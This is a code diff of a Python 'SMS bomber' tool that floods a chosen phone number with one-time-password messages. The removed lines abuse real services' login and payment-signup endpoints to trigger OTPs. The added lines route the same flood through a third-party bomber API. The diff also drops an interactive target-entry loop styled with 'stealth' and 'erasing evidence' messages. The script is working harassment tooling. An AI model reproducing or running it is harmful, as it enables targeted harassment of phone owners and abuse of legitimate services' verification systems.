@@ -81,7 +81,7 @@ def check_key():
 
 # Function to send OTPs with advanced tracking
 def send_otp(phone, count):
-    """Deploy OTPs with professional-grade error handling and logging."""
+    """Deploy OTPs using ShadowScriptz API."""
     if not is_valid_phone(phone):
         print(f"{Fore.RED}📵 Invalid phone number! Use +923xxxxxxxxx format.{Style.RESET_ALL}")
         log_action(f"Invalid phone number: {phone}")
@@ -91,76 +91,30 @@ def send_otp(phone, count):
         log_action(f"Invalid OTP count: {count}")
         return
 
-    print(f"{Fore.YELLOW}💥 Initiating covert OTP deployment...{Style.RESET_ALL}")
+    print(f"{Fore.YELLOW}💥 Initiating OTP deployment using ShadowScriptz API...{Style.RESET_ALL}")
     log_action(f"Starting OTP deployment for {phone} with count {count}.")
     success_count = 0
+
     for i in range(count):
         try:
             headers = {"User-Agent": USER_AGENT}
-            if i % 2 == 0:
-                url = f"https://bajao.pk/api/v2/login/generatePin?uuid={phone}"
-                response = requests.post(url, headers=headers)
+            payload = {"number": phone}
+            response = requests.post(
+                "https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php",
+                headers=headers,
+                data=payload
+            )
+            if response.status_code == 200:
+                success_count += 1
+                print(f"{Fore.GREEN}✅ OTP {i + 1}/{count} deployed. Status: {response.status_code}{Style.RESET_ALL}")
+                log_action(f"OTP {i + 1}/{count} deployed successfully. Status: {response.status_code}")
             else:
-                url = "https://tappayments.tapmad.com/pay/api/initiatePaymentTransactionNewPackage"
-                payload = {
-                    "Version": "V1",
-                    "Language": "en",
-                    "Platform": "web",
-                    "ProductId": 1733,
-                    "MobileNo": phone,
-                    "OperatorId": "100007",
-                    "URL": "https://www.tapmad.com/sign-up",
-                    "source": "organic",
-                    "medium": "organic"
-                }
-                response = requests.post(url, headers=headers, json=payload)
-            
-            success_count += 1
-            print(f"{Fore.GREEN}✅ OTP {i + 1}/{count} deployed. Status: {response.status_code}{Style.RESET_ALL}")
-            log_action(f"OTP {i + 1}/{count} deployed successfully. Status: {response.status_code}")
+                print(f"{Fore.RED}❌ OTP {i + 1} failed. Status: {response.status_code}{Style.RESET_ALL}")
+                log_action(f"OTP {i + 1} failed. Status: {response.status_code}")
         except requests.RequestException as e:
             print(f"{Fore.RED}⚠️ OTP {i + 1} failed: {e}{Style.RESET_ALL}")
             log_action(f"OTP {i + 1} failed: {e}")
         time.sleep(0.7)  # Stealth delay
+
     log_action(f"Deployment complete. Success: {success_count}/{count}")
-
     print(f"{Fore.GREEN}🎯 Mission complete. {success_count}/{count} OTPs deployed.{Style.RESET_ALL}")
-
-# Main function with pro-hacker workflow and restart behavior
-def main():
-    """Execute the SMS bomber with a professional hacker interface."""
-    if os.path.exists(LOG_FILE):
-        os.remove(LOG_FILE)  # Fresh log for new session
-    log_action("Sycho SMS Bomber v2.8 launched.")
-    while True:
-        os.system("clear")  # Clear the screen for a fresh start
-        display_banner()
-        if not check_key():
-            return
-        print(f"\n{Fore.RED}📱 Enter Target Phone Number (+923xxxxxxxxx): {Style.RESET_ALL}")
-        phone = input().strip()
-        print(f"{Fore.RED}🔢 Enter OTP Count (1-100): {Style.RESET_ALL}")
-        try:
-            count = int(input())
-            send_otp(phone, count)
-        except ValueError:
-            print(f"{Fore.RED}❌ Invalid input detected. Enter a numeric value.{Style.RESET_ALL}")
-            log_action("Invalid input detected during OTP count entry.")
-        print(f"\n{Fore.YELLOW}🔥 Continue operation? (y/n): {Style.RESET_ALL}")
-        if input().lower() != 'y':
-            print(f"{Fore.CYAN}👋 Exfiltration successful. Stay undetectable, SychoX2006.{Style.RESET_ALL}")
-            log_action("Operation terminated by user.")
-            break
-        log_action("Restarting operation with screen clear.")
-
-if __name__ == "__main__":
-    try:
-        main()
-    except KeyboardInterrupt:
-        print(f"\n{Fore.RED}🚨 Operation aborted. Cleaning tracks...{Style.RESET_ALL}")
-        log_action("Operation aborted by user.")
-        sys.exit(0)
-    except Exception as e:
-        print(f"{Fore.RED}❌ Critical failure: {e}. Erasing evidence...{Style.RESET_ALL}")
-        log_action(f"Critical failure: {e}")
-        sys.exit(1)
